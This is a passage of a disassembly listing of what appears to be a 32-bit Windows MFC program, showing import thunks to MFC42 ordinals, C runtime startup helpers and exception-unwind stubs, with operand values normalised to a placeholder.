jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_4696
jmp [ Ordinal_MFC42_4696@IAT ]
Ordinal_MFC42_3058
jmp [ Ordinal_MFC42_3058@IAT ]
Ordinal_MFC42_3065
jmp [ Ordinal_MFC42_3065@IAT ]
Ordinal_MFC42_6336
jmp [ Ordinal_MFC42_6336@IAT ]
Ordinal_MFC42_2510
jmp [ Ordinal_MFC42_2510@IAT ]
Ordinal_MFC42_2542
jmp [ Ordinal_MFC42_2542@IAT ]
Ordinal_MFC42_5243
jmp [ Ordinal_MFC42_5243@IAT ]
Ordinal_MFC42_5740
jmp [ Ordinal_MFC42_5740@IAT ]
Ordinal_MFC42_1746
jmp [ Ordinal_MFC42_1746@IAT ]
Ordinal_MFC42_5577
jmp [ Ordinal_MFC42_5577@IAT ]
Ordinal_MFC42_3172
jmp [ Ordinal_MFC42_3172@IAT ]
Ordinal_MFC42_5653
jmp [ Ordinal_MFC42_5653@IAT ]
Ordinal_MFC42_4420
jmp [ Ordinal_MFC42_4420@IAT ]
Ordinal_MFC42_4953
jmp [ Ordinal_MFC42_4953@IAT ]
Ordinal_MFC42_4858
jmp [ Ordinal_MFC42_4858@IAT ]
Ordinal_MFC42_2399
jmp [ Ordinal_MFC42_2399@IAT ]
Ordinal_MFC42_4387
jmp [ Ordinal_MFC42_4387@IAT ]
Ordinal_MFC42_3454
jmp [ Ordinal_MFC42_3454@IAT ]
Ordinal_MFC42_3198
jmp [ Ordinal_MFC42_3198@IAT ]
Ordinal_MFC42_6080
jmp [ Ordinal_MFC42_6080@IAT ]
Ordinal_MFC42_6175
jmp [ Ordinal_MFC42_6175@IAT ]
Ordinal_MFC42_4623
jmp [ Ordinal_MFC42_4623@IAT ]
Ordinal_MFC42_4426
jmp [ Ordinal_MFC42_4426@IAT ]
Ordinal_MFC42_338
jmp [ Ordinal_MFC42_338@IAT ]
Ordinal_MFC42_652
jmp [ Ordinal_MFC42_652@IAT ]
Ordinal_MFC42_4823
jmp [ Ordinal_MFC42_4823@IAT ]
Ordinal_MFC42_4614
jmp [ Ordinal_MFC42_4614@IAT ]
Ordinal_MFC42_4613
jmp [ Ordinal_MFC42_4613@IAT ]
Ordinal_MFC42_4589
jmp [ Ordinal_MFC42_4589@IAT ]
Ordinal_MFC42_4899
jmp [ Ordinal_MFC42_4899@IAT ]
Ordinal_MFC42_5076
jmp [ Ordinal_MFC42_5076@IAT ]
Ordinal_MFC42_4341
jmp [ Ordinal_MFC42_4341@IAT ]
Ordinal_MFC42_4349
jmp [ Ordinal_MFC42_4349@IAT ]
Ordinal_MFC42_4723
jmp [ Ordinal_MFC42_4723@IAT ]
Ordinal_MFC42_4890
jmp [ Ordinal_MFC42_4890@IAT ]
Ordinal_MFC42_4531
jmp [ Ordinal_MFC42_4531@IAT ]
Ordinal_MFC42_4545
jmp [ Ordinal_MFC42_4545@IAT ]
Ordinal_MFC42_4543
jmp [ Ordinal_MFC42_4543@IAT ]
Ordinal_MFC42_4526
jmp [ Ordinal_MFC42_4526@IAT ]
Ordinal_MFC42_4529
jmp [ Ordinal_MFC42_4529@IAT ]
Ordinal_MFC42_4524
jmp [ Ordinal_MFC42_4524@IAT ]
Ordinal_MFC42_4964
jmp [ Ordinal_MFC42_4964@IAT ]
Ordinal_MFC42_4961
jmp [ Ordinal_MFC42_4961@IAT ]
Ordinal_MFC42_4108
jmp [ Ordinal_MFC42_4108@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_5240
jmp [ Ordinal_MFC42_5240@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3748
jmp [ Ordinal_MFC42_3748@IAT ]
Ordinal_MFC42_1726
jmp [ Ordinal_MFC42_1726@IAT ]
Ordinal_MFC42_4432
jmp [ Ordinal_MFC42_4432@IAT ]
Ordinal_MFC42_560
jmp [ Ordinal_MFC42_560@IAT ]
Ordinal_MFC42_813
jmp [ Ordinal_MFC42_813@IAT ]
Ordinal_MFC42_5260
jmp [ Ordinal_MFC42_5260@IAT ]
Ordinal_MFC42_3571
jmp [ Ordinal_MFC42_3571@IAT ]
Ordinal_MFC42_3573
jmp [ Ordinal_MFC42_3573@IAT ]
Ordinal_MFC42_3693
jmp [ Ordinal_MFC42_3693@IAT ]
Ordinal_MFC42_3626
jmp [ Ordinal_MFC42_3626@IAT ]
Ordinal_MFC42_3663
jmp [ Ordinal_MFC42_3663@IAT ]
Ordinal_MFC42_640
jmp [ Ordinal_MFC42_640@IAT ]
Ordinal_MFC42_2405
jmp [ Ordinal_MFC42_2405@IAT ]
Ordinal_MFC42_2414
jmp [ Ordinal_MFC42_2414@IAT ]
Ordinal_MFC42_5787
jmp [ Ordinal_MFC42_5787@IAT ]
Ordinal_MFC42_5788
jmp [ Ordinal_MFC42_5788@IAT ]
Ordinal_MFC42_2753
jmp [ Ordinal_MFC42_2753@IAT ]
Ordinal_MFC42_5785
jmp [ Ordinal_MFC42_5785@IAT ]
Ordinal_MFC42_1641
jmp [ Ordinal_MFC42_1641@IAT ]
Ordinal_MFC42_1640
jmp [ Ordinal_MFC42_1640@IAT ]
Ordinal_MFC42_323
jmp [ Ordinal_MFC42_323@IAT ]
Ordinal_MFC42_2535
jmp [ Ordinal_MFC42_2535@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_4464
jmp [ Ordinal_MFC42_4464@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_4436
jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_554
jmp [ Ordinal_MFC42_554@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_807
jmp [ Ordinal_MFC42_807@IAT ]
Ordinal_MFC42_2494
jmp [ Ordinal_MFC42_2494@IAT ]
Ordinal_MFC42_2627
jmp [ Ordinal_MFC42_2627@IAT ]
Ordinal_MFC42_2626
jmp [ Ordinal_MFC42_2626@IAT ]
Ordinal_MFC42_6000
jmp [ Ordinal_MFC42_6000@IAT ]
Ordinal_MFC42_2117
jmp [ Ordinal_MFC42_2117@IAT ]
Ordinal_MFC42_4163
jmp [ Ordinal_MFC42_4163@IAT ]
Ordinal_MFC42_6625
jmp [ Ordinal_MFC42_6625@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_4284
jmp [ Ordinal_MFC42_4284@IAT ]
sub_405dc8
cmp [ rwxdata ] 0xffffffff
jne rwxdata
push rwxdata
push rwxdata
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_405df4
push [ esp + 0x4 ]
call sub_405dc8
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_405f80
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_405f92
xor eax eax
retn
sub_405f95
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_405fa2
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_405fe8
jmp sub_405fe8
sub_405fe8
push 0x600
push 0x0
call sub_405fba
mov [ rwxdata ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_406010
mov eax [ ebp - 0x138 ]
push eax
call sub_4042b0
retn
sub_40601d
lea ecx [ ebp - 0x134 ]
jmp Ordinal_MFC42_617
sub_406028
mov eax rwxdata
jmp __CxxFrameHandler
sub_406040
lea ecx [ ebp - 0x6c ]
jmp sub_404220
sub_406048
mov eax rwxdata
jmp __CxxFrameHandler
sub_406060
mov eax [ ebp - 0x10 ]
push eax
call sub_4042b0
retn
sub_40606a
mov eax rwxdata
jmp __CxxFrameHandler
sub_406080
mov eax [ ebp - 0x10 ]
push eax
call sub_4042b0
retn
sub_40608a
mov eax rwxdata
jmp __CxxFrameHandler
sub_4060a0
lea ecx [ ebp - 0x3c ]
jmp sub_405540
sub_4060a8
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_640
sub_4060b0
lea ecx [ ebp - 0x44 ]
jmp sub_405460
sub_4060b8
lea ecx [ ebp - 0x4c ]
jmp sub_4054d0
sub_4060c0
lea ecx [ ebp - 0x24 ]
jmp sub_4054d0
sub_4060c8
lea ecx [ ebp - 0x2c ]
jmp sub_4054d0
sub_4060d0
lea ecx [ ebp - 0x34 ]
jmp sub_4054d0
sub_4060d8
lea ecx [ ebp - 0x34 ]
jmp sub_4053c0
sub_4060e0
lea ecx [ ebp - 0x2c ]
jmp sub_4053c0
sub_4060e8
lea ecx [ ebp - 0x24 ]
jmp sub_4053c0
sub_4060f0
lea ecx [ ebp - 0x4c ]
jmp sub_4053c0
sub_4060f8
lea ecx [ ebp - 0x44 ]
jmp sub_4053c0
sub_406100
lea ecx [ ebp - 0x3c ]
jmp sub_4053c0
sub_406108
mov eax rwxdata
jmp __CxxFrameHandler
sub_406120
mov ecx [ ebp - 0x10 ]
jmp sub_4053c0
sub_406128
mov eax rwxdata
jmp __CxxFrameHandler
sub_406140
mov ecx [ ebp - 0x10 ]
jmp sub_4053c0
sub_406148
mov eax rwxdata
jmp __CxxFrameHandler
sub_406160
mov ecx [ ebp - 0x10 ]
jmp sub_4053c0
sub_406168
mov eax rwxdata
jmp __CxxFrameHandler
sub_406180
mov ecx [ ebp - 0x10 ]
jmp sub_4053c0
sub_406188
mov eax rwxdata
jmp __CxxFrameHandler
sub_4061a0
mov eax [ ebp - 0x10 ]
push eax
call sub_4042b0
retn
sub_4061aa
mov eax rwxdata
jmp __CxxFrameHandler
sub_4061c0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_4061c8
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_4061d6
mov eax rwxdata
jmp __CxxFrameHandler
sub_4061e0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_4061e8
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_4061f6
mov eax rwxdata
jmp __CxxFrameHandler
sub_40627b
jmp [ eax + 0x60 ]
